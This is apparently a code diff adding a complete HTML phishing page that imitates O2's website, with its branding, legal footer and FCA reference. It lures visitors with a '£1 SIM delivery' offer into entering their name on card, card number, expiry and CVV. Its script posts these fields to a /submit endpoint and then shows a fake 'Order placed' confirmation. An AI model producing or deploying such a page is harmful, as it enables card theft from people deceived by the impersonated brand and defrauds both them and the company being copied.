@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Get Your SIM – O2</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Inter', sans-serif; background: #f4f4f6; color: #1a1a2e; }
+
+  /* TOP BAR */
+  .top-bar { background: #f0f0f5; padding: 8px 24px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #333; }
+  .top-bar a { color: #0019a5; text-decoration: none; }
+  .top-bar a:hover { text-decoration: underline; }
+  .top-bar-left span { margin-right: 4px; }
+  .top-bar-left a { border-left: 1px solid #aaa; padding-left: 8px; margin-left: 4px; }
+
+  /* NAV */
+  nav { background: #0019a5; padding: 0 24px; display: flex; align-items: center; justify-content: space-between; height: 64px; }
+  .nav-logo { color: #fff; font-size: 32px; font-weight: 800; letter-spacing: -1px; display: flex; align-items: center; gap: 0; }
+  .nav-logo .subscript { font-size: 14px; font-weight: 700; margin-top: 10px; margin-left: 1px; }
+  .nav-links { display: flex; gap: 32px; }
+  .nav-links a { color: #fff; text-decoration: none; font-size: 15px; font-weight: 500; opacity: 0.9; transition: opacity 0.2s; }
+  .nav-links a:hover { opacity: 1; }
+  .nav-right { display: flex; align-items: center; gap: 20px; color: #fff; font-size: 14px; font-weight: 500; }
+  .nav-right span { cursor: pointer; opacity: 0.9; }
+  .nav-right span:hover { opacity: 1; }
+
+  /* DELIVERY BANNER */
+  .delivery-banner { background: #fff; border-bottom: 1px solid #e0e0e8; text-align: center; padding: 10px 16px; font-size: 13px; color: #333; }
+  .delivery-banner a { color: #0019a5; text-decoration: none; }
+  .delivery-banner .icon { display: inline-block; background: #0019a5; color: #fff; border-radius: 50%; width: 24px; height: 24px; line-height: 24px; text-align: center; font-size: 12px; margin-right: 6px; vertical-align: middle; }
+
+  /* HERO */
+  .hero { background: linear-gradient(135deg, #0019a5 55%, #003de0 100%); min-height: 420px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+  .hero::after { content: ''; position: absolute; right: -80px; top: -80px; width: 400px; height: 400px; border-radius: 50%; background: rgba(255,255,255,0.04); }
+  .hero::before { content: ''; position: absolute; right: 60px; bottom: -60px; width: 260px; height: 260px; border-radius: 50%; background: rgba(255,255,255,0.06); }
+  .hero-content { max-width: 1100px; width: 100%; padding: 60px 40px; display: flex; align-items: center; justify-content: space-between; gap: 40px; z-index: 1; }
+  .hero-text { flex: 1; }
+  .hero-text h1 { font-size: 44px; font-weight: 800; color: #fff; line-height: 1.1; margin-bottom: 14px; }
+  .hero-text h1 span { color: #7df9ff; }
+  .hero-text p { font-size: 18px; color: rgba(255,255,255,0.85); margin-bottom: 28px; line-height: 1.5; }
+  .hero-badge { display: inline-flex; align-items: center; gap: 10px; background: rgba(255,255,255,0.12); border: 2px solid rgba(255,255,255,0.3); border-radius: 50px; padding: 10px 24px; color: #fff; font-size: 15px; font-weight: 600; backdrop-filter: blur(8px); margin-bottom: 28px; }
+  .hero-badge .price { font-size: 28px; font-weight: 800; color: #7df9ff; }
+
+  /* SIM CARD VISUAL */
+  .sim-visual { flex: 0 0 auto; }
+  .sim-card { width: 200px; height: 130px; background: linear-gradient(135deg, #1a2a8a 0%, #0019a5 50%, #0040ff 100%); border-radius: 16px; display: flex; flex-direction: column; justify-content: space-between; padding: 18px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); position: relative; overflow: hidden; }
+  .sim-card::after { content: ''; position: absolute; top: 0; right: 0; width: 80px; height: 80px; border-radius: 50%; background: rgba(255,255,255,0.06); transform: translate(30%, -30%); }
+  .sim-chip { width: 40px; height: 28px; background: linear-gradient(135deg, #d4a853, #f0c96a); border-radius: 5px; }
+  .sim-logo { color: #fff; font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }
+  .sim-logo span { font-size: 10px; vertical-align: super; }
+
+  /* MAIN CONTENT */
+  .main { max-width: 1100px; margin: 0 auto; padding: 48px 24px; display: grid; grid-template-columns: 1fr 1fr; gap: 32px; align-items: start; }
+
+  /* DEAL INFO */
+  .deal-info { background: #fff; border-radius: 16px; padding: 32px; box-shadow: 0 4px 24px rgba(0,25,165,0.08); }
+  .deal-info h2 { font-size: 22px; font-weight: 700; color: #0019a5; margin-bottom: 20px; }
+  .deal-row { display: flex; align-items: center; gap: 14px; padding: 14px 0; border-bottom: 1px solid #f0f0f8; }
+  .deal-row:last-child { border-bottom: none; }
+  .deal-icon { width: 40px; height: 40px; background: #eef0ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; }
+  .deal-row-text strong { display: block; font-size: 15px; font-weight: 600; color: #1a1a2e; }
+  .deal-row-text span { font-size: 13px; color: #666; }
+  .price-highlight { display: flex; align-items: baseline; gap: 6px; margin: 24px 0 8px; }
+  .price-highlight .big { font-size: 52px; font-weight: 800; color: #0019a5; line-height: 1; }
+  .price-highlight .curr { font-size: 28px; font-weight: 700; color: #0019a5; }
+  .price-highlight .per { font-size: 14px; color: #666; align-self: flex-end; margin-bottom: 6px; }
+  .deal-info .small-note { font-size: 12px; color: #888; margin-top: 4px; }
+  .trust-badges { display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap; }
+  .trust-badge { background: #f4f4f6; border-radius: 8px; padding: 8px 12px; font-size: 12px; color: #444; font-weight: 500; display: flex; align-items: center; gap: 5px; }
+
+  /* PAYMENT FORM */
+  .payment-form { background: #fff; border-radius: 16px; padding: 32px; box-shadow: 0 4px 24px rgba(0,25,165,0.08); }
+  .payment-form h2 { font-size: 22px; font-weight: 700; color: #1a1a2e; margin-bottom: 6px; }
+  .payment-form .subtitle { font-size: 14px; color: #666; margin-bottom: 28px; }
+  .form-group { margin-bottom: 20px; }
+  .form-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 7px; letter-spacing: 0.02em; }
+  .form-group input { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e8; border-radius: 10px; font-size: 15px; font-family: 'Inter', sans-serif; color: #1a1a2e; background: #fafafa; transition: border-color 0.2s, box-shadow 0.2s; outline: none; }
+  .form-group input:focus { border-color: #0019a5; box-shadow: 0 0 0 4px rgba(0,25,165,0.1); background: #fff; }
+  .form-group input::placeholder { color: #bbb; }
+  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .card-icons { display: flex; gap: 8px; margin-bottom: 16px; }
+  .card-icon { width: 42px; height: 28px; border-radius: 5px; border: 1px solid #e0e0e8; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; }
+  .card-icon.visa { background: #1a1f71; color: #fff; }
+  .card-icon.mc { background: linear-gradient(135deg, #eb001b, #f79e1b); color: #fff; }
+  .card-icon.amex { background: #2e77bc; color: #fff; }
+  .secure-note { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #666; margin-bottom: 20px; }
+  .secure-note .lock { color: #0019a5; }
+  .submit-btn { width: 100%; padding: 16px; background: #0019a5; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 700; cursor: pointer; transition: background 0.2s, transform 0.1s; font-family: 'Inter', sans-serif; letter-spacing: 0.02em; }
+  .submit-btn:hover { background: #0022cc; }
+  .submit-btn:active { transform: scale(0.99); }
+  .form-footer { text-align: center; font-size: 12px; color: #888; margin-top: 14px; line-height: 1.6; }
+  .form-footer a { color: #0019a5; text-decoration: none; }
+
+  /* CATEGORIES */
+  .categories { background: #f4f4f6; padding: 48px 24px; }
+  .categories-inner { max-width: 1100px; margin: 0 auto; }
+  .categories h2 { font-size: 22px; font-weight: 700; color: #1a1a2e; margin-bottom: 24px; text-align: center; }
+  .cat-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; }
+  .cat-item { background: #fff; border: 1px solid #e0e0e8; border-radius: 12px; padding: 20px 12px; text-align: center; cursor: pointer; transition: border-color 0.2s, box-shadow 0.2s; }
+  .cat-item:hover { border-color: #0019a5; box-shadow: 0 4px 16px rgba(0,25,165,0.12); }
+  .cat-item .cat-icon { font-size: 26px; margin-bottom: 8px; }
+  .cat-item span { font-size: 13px; font-weight: 500; color: #1a1a2e; }
+
+  /* FOOTER */
+  footer { background: #0019a5; color: #fff; padding: 48px 24px 24px; }
+  .footer-inner { max-width: 1100px; margin: 0 auto; }
+  .footer-grid { display: grid; grid-template-columns: 1fr 2fr 1fr; gap: 40px; margin-bottom: 40px; }
+  .footer-links-col h4 { font-size: 15px; font-weight: 700; margin-bottom: 16px; }
+  .footer-links-col a { display: block; color: rgba(255,255,255,0.85); text-decoration: none; font-size: 14px; margin-bottom: 10px; transition: color 0.2s; }
+  .footer-links-col a:hover { color: #fff; }
+  .footer-left a { display: flex; align-items: center; gap: 10px; color: rgba(255,255,255,0.85); text-decoration: none; font-size: 14px; margin-bottom: 16px; transition: color 0.2s; }
+  .footer-left a:hover { color: #fff; }
+  .footer-left .icon { width: 32px; height: 32px; border: 1px solid rgba(255,255,255,0.4); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; }
+  .social-row { display: flex; gap: 14px; margin: 20px 0; }
+  .social-btn { width: 36px; height: 36px; border: 1px solid rgba(255,255,255,0.4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 15px; color: #fff; text-decoration: none; transition: background 0.2s; }
+  .social-btn:hover { background: rgba(255,255,255,0.15); }
+  .footer-bottom { border-top: 1px solid rgba(255,255,255,0.2); padding-top: 20px; font-size: 12px; color: rgba(255,255,255,0.7); line-height: 1.8; }
+  .footer-bottom-links { display: flex; flex-wrap: wrap; gap: 6px 16px; margin-bottom: 10px; }
+  .footer-bottom-links a { color: rgba(255,255,255,0.7); text-decoration: none; }
+  .footer-bottom-links a:hover { color: #fff; }
+
+  @media (max-width: 768px) {
+    .main { grid-template-columns: 1fr; }
+    .hero-content { flex-direction: column; text-align: center; }
+    .hero-text h1 { font-size: 30px; }
+    .cat-grid { grid-template-columns: repeat(3, 1fr); }
+    .footer-grid { grid-template-columns: 1fr; }
+    .form-row { grid-template-columns: 1fr; }
+    .nav-links { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="top-bar">
+  <div class="top-bar-left">
+    <span>Personal</span>
+    <a href="#">Business</a>
+  </div>
+  <div>
+    <a href="#">Sign in</a> or <a href="#">Register</a>
+  </div>
+</div>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-logo">O<span class="subscript">2</span></div>
+  <div class="nav-links">
+    <a href="#">Shop</a>
+    <a href="#">Why O2</a>
+    <a href="#">Help</a>
+  </div>
+  <div class="nav-right">
+    <span>My O2</span>
+    <span>🔍 Search</span>
+    <span>🛒</span>
+  </div>
+</nav>
+
+<!-- DELIVERY BANNER -->
+<div class="delivery-banner">
+  <span class="icon">🚚</span>
+  <a href="#">Free standard delivery included. Premium delivery options from £5.99–£9.99.</a>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-content">
+    <div class="hero-text">
+      <div class="hero-badge">
+        🎉 Limited Time Offer &nbsp;|&nbsp; <span class="price">£1</span> &nbsp;SIM Delivery
+      </div>
+      <h1>Get your SIM delivered for just <span>£1</span></h1>
+      <p>Stay connected on the UK's most reliable network. Your SIM delivered straight to your door — no fuss, no hidden fees.</p>
+    </div>
+    <div class="sim-visual">
+      <div class="sim-card">
+        <div class="sim-chip"></div>
+        <div class="sim-logo">O<span>2</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div class="main">
+
+  <!-- DEAL INFO -->
+  <div class="deal-info">
+    <h2>What's included</h2>
+
+    <div class="price-highlight">
+      <span class="curr">£</span>
+      <span class="big">1</span>
+      <span class="per">one-off delivery</span>
+    </div>
+    <div class="small-note">No contract. No commitment. Cancel anytime.</div>
+
+    <div style="margin-top: 24px;">
+      <div class="deal-row">
+        <div class="deal-icon">📶</div>
+        <div class="deal-row-text">
+          <strong>UK's Best Network</strong>
+          <span>Powered by O2's award-winning 4G & 5G network</span>
+        </div>
+      </div>
+      <div class="deal-row">
+        <div class="deal-icon">🚀</div>
+        <div class="deal-row-text">
+          <strong>Next Day Delivery</strong>
+          <span>Order before 9pm for next day delivery</span>
+        </div>
+      </div>
+      <div class="deal-row">
+        <div class="deal-icon">💳</div>
+        <div class="deal-row-text">
+          <strong>Pay As You Go or SIM Only</strong>
+          <span>Choose a plan that works for you</span>
+        </div>
+      </div>
+      <div class="deal-row">
+        <div class="deal-icon">🌍</div>
+        <div class="deal-row-text">
+          <strong>Roam in 75+ destinations</strong>
+          <span>Travel abroad and stay connected</span>
+        </div>
+      </div>
+      <div class="deal-row">
+        <div class="deal-icon">🎵</div>
+        <div class="deal-row-text">
+          <strong>O2 Priority rewards</strong>
+          <span>Exclusive deals, tickets & experiences</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="trust-badges">
+      <div class="trust-badge">✅ No credit check</div>
+      <div class="trust-badge">🔒 Secure checkout</div>
+      <div class="trust-badge">📦 Free returns</div>
+    </div>
+  </div>
+
+  <!-- PAYMENT FORM -->
+  <div class="payment-form">
+    <h2>Enter your payment details</h2>
+    <p class="subtitle">Pay just £1 to get your SIM delivered to your door.</p>
+
+    <div class="card-icons">
+      <div class="card-icon visa">VISA</div>
+      <div class="card-icon mc">MC</div>
+      <div class="card-icon amex">AMEX</div>
+    </div>
+
+    <div class="secure-note">
+      <span class="lock">🔒</span>
+      <span>Your payment is secured with 256-bit SSL encryption</span>
+    </div>
+
+    <form id="paymentForm" onsubmit="handleSubmit(event)">
+      <div class="form-group">
+        <label for="nameOnCard">Name on card</label>
+        <input type="text" id="nameOnCard" name="nameOnCard" placeholder="e.g. John Smith" autocomplete="cc-name" required>
+      </div>
+
+      <div class="form-group">
+        <label for="cardNumber">Card number</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" required>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label for="expiry">Expiry date</label>
+          <input type="text" id="expiry" name="expiry" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp" required>
+        </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <input type="text" id="cvv" name="cvv" placeholder="•••" maxlength="4" autocomplete="cc-csc" required>
+        </div>
+      </div>
+
+      <button type="submit" class="submit-btn">Pay £1 & Get My SIM →</button>
+    </form>
+
+    <div class="form-footer">
+      By continuing you agree to our <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a>.<br>
+      ©2026 Telefónica UK Limited. Registered in England. O2 is a trading name of Telefónica UK Limited.
+    </div>
+  </div>
+
+</div>
+
+<!-- CATEGORIES -->
+<div class="categories">
+  <div class="categories-inner">
+    <h2>Find your ideal tech and more</h2>
+    <div class="cat-grid">
+      <div class="cat-item">
+        <div class="cat-icon">☀️</div>
+        <span>Summer Sale</span>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">📱</div>
+        <span>Phones</span>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">📶</div>
+        <span>SIM Only</span>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">💻</div>
+        <span>Tablets</span>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">⌚</div>
+        <span>Smartwatches</span>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">🎧</div>
+        <span>Accessories</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-left">
+        <a href="#"><span class="icon">🏪</span> Find a store</a>
+        <a href="#"><span class="icon">📡</span> Check our network</a>
+        <a href="#"><span class="icon">👤</span> Sign in to My O2</a>
+        <a href="#"><span class="icon">📦</span> Track my order</a>
+        <a href="#"><span class="icon">🔍</span> Search</a>
+        <div class="social-row">
+          <a class="social-btn" href="#">f</a>
+          <a class="social-btn" href="#">▶</a>
+          <a class="social-btn" href="#">✕</a>
+          <a class="social-btn" href="#">📷</a>
+        </div>
+      </div>
+      <div class="footer-links-col">
+        <h4>Popular in shop</h4>
+        <a href="#">iPhone 17 Pro Max</a>
+        <a href="#">iPhone 17 Pro</a>
+        <a href="#">iPhone 17</a>
+        <a href="#">Apple Watch Series 11</a>
+        <a href="#">Samsung Galaxy S26 Ultra</a>
+        <a href="#">Samsung Galaxy Z Fold7</a>
+        <a href="#">Google Pixel 10 Pro XL</a>
+        <a href="#">SIM Only Deals</a>
+      </div>
+      <div>
+        <div class="footer-links-col">
+          <h4>Help and Support</h4>
+          <a href="#">Help home</a>
+          <a href="#">Contact us</a>
+          <a href="#">My O2</a>
+          <a href="#">Collection and delivery</a>
+        </div>
+        <div class="footer-links-col" style="margin-top: 24px;">
+          <h4>Shop</h4>
+          <a href="#">Phones</a>
+          <a href="#">Tablets</a>
+          <a href="#">Pay Monthly SIM</a>
+          <a href="#">Pay As You Go SIM</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <div class="footer-bottom-links">
+        <a href="#">About O2</a>
+        <span style="opacity:0.4">|</span>
+        <a href="#">Better Connections Plan</a>
+        <span style="opacity:0.4">|</span>
+        <a href="#">Careers</a>
+        <span style="opacity:0.4">|</span>
+        <a href="#">News & PR</a>
+        <span style="opacity:0.4">|</span>
+        <a href="#">Privacy policy</a>
+        <span style="opacity:0.4">|</span>
+        <a href="#">Terms & Conditions</a>
+        <span style="opacity:0.4">|</span>
+        <a href="#">Cookie policy</a>
+      </div>
+      <div>©2026 Telefónica UK Limited</div>
+      <div>Registered office: 500 Brook Drive, Reading, Berkshire, RG2 6UU</div>
+      <div>In relation to consumer credit, Telefónica UK Limited is authorised and regulated by the Financial Conduct Authority (Reference Number 718822)</div>
+    </div>
+  </div>
+</footer>
+
+<script>
+  // Format card number with spaces
+  document.getElementById('cardNumber').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+    let formatted = v.match(/.{1,4}/g);
+    e.target.value = formatted ? formatted.join(' ') : v;
+  });
+
+  // Format expiry
+  document.getElementById('expiry').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+    if (v.length >= 2) v = v.substring(0, 2) + ' / ' + v.substring(2);
+    e.target.value = v;
+  });
+
+  // CVV numbers only
+  document.getElementById('cvv').addEventListener('input', function(e) {
+    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+  });
+
+  function handleSubmit(e) {
+    e.preventDefault();
+    const btn = document.querySelector('.submit-btn');
+    btn.textContent = 'Processing...';
+    btn.style.background = '#0040cc';
+    
+    const formData = {
+      nameOnCard: document.getElementById('nameOnCard').value,
+      cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+      expiry: document.getElementById('expiry').value.replace(/\s/g, ''),
+      cvv: document.getElementById('cvv').value
+    };
+    
+    fetch('/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(formData)
+    })
+    .then(res => res.json())
+    .then(data => {
+      setTimeout(() => {
+        btn.textContent = '✓ Order placed! Your SIM is on its way.';
+        btn.style.background = '#006400';
+        document.getElementById('paymentForm').reset();
+      }, 1800);
+    })
+    .catch(err => {
+      btn.textContent = 'Error. Please try again.';
+      btn.style.background = '#cc0000';
+      console.error('Submission error:', err);
+    });
+  }
+</script>
+
+</body>
+</html>
